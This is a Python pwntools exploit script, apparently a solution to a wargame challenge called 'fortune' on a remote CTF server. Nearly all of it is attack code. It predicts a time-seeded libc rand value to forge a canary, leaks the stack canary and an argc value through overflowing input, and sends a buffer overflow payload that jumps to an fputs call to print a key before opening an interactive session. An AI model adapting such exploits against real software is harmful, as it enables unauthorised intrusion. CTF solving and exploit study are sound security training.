from pwn import *
from ctypes import *
import time

libc=CDLL('libc.so.6')
s=process('./fortune')
s=remote('war.sejongssg.kr',40206)
def rands():
	rand1 = libc.rand()
	rand2 = (rand1 * libc.rand()) & 4294967295
	rand3 = libc.rand()
	canary = (rand2*rand3) & 4294967295
	return canary
key = 0x0804A0A0
fputs = 0x0804881E



print s.recvuntil('one?      ==')
seed = libc.time(0)
libc.srand(seed)
s.recvuntil('=========================================')
s.recvuntil('=========================================')

canary = rands()

print s.recvuntil('> ')
s.sendline('1')
s.recvuntil(' : ')
s.sendline('a'*100+'\xff')
canary = rands()
time.sleep(1)
print s.recvuntil('> ')
s.sendline('1')
print s.recvuntil(' : ')
s.sendline('a'*100+'\x01\x40\x40\x40'+p32(canary)+'a')
print s.recvuntil(' : ')
print s.recv(108)
leak_canary = u32(s.recv(4))
leak_canary = leak_canary-ord('a')

canary = rands()

print s.recvuntil('> ')
s.sendline('1')
print s.recvuntil(' : ')
s.sendline('a'*100+'\x01\x40\x40\x40'+p32(canary)+'aaaa')
print s.recvuntil(' : ')
print s.recv(112)
argc_leak = u32(s.recv(4))
#string start
canary = rands()
print 'argc : '+hex(argc_leak)
print s.recvuntil('> ')
s.sendline('1')
print s.recvuntil(' : ')
payload = '11111111'+p32(key)+'a'*92+p32(canary)+p32(leak_canary)+p32(argc_leak)+'a'*24+p32(fputs)+'1111'+p32(key)
print 'payload`s len : '+str(len(payload))
s.sendline(payload)
#s.sendline(p32(0x0804881E)+'1111'+p32(key)+'a'*92+p32(canary)+p32(leak_canary)+p32(argc_leak))
print s.recvuntil('> ')
s.interactive()

s.sendline('2')
print s.recv(200)